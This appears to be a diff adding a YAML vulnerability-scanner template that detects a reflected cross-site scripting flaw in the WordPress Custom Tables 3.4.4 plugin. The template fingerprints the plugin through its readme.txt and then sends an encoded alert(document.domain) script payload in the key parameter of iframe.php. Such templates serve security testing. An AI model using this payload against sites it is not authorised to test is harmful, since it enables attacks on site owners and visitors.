@@ -1,0 +1,41 @@
+id: wp-custom-tables-xss
+brief:
+    title: WordPress Custom Tables 3.4.4 - Cross-Site Scripting
+    by: daffainfo
+    level: high
+    about: WordPress Custom Tables 3.4.4 plugin contains a cross-site scripting vulnerability via the key parameter.
+    label:
+        - wpscan
+        - wordpress
+        - xss
+        - wp-plugin
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/custom-tables/readme.txt'
+      signs:
+        - "on": word
+          has:
+            - custom tables
+            - 'Tags:'
+          in: body
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - </script><script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
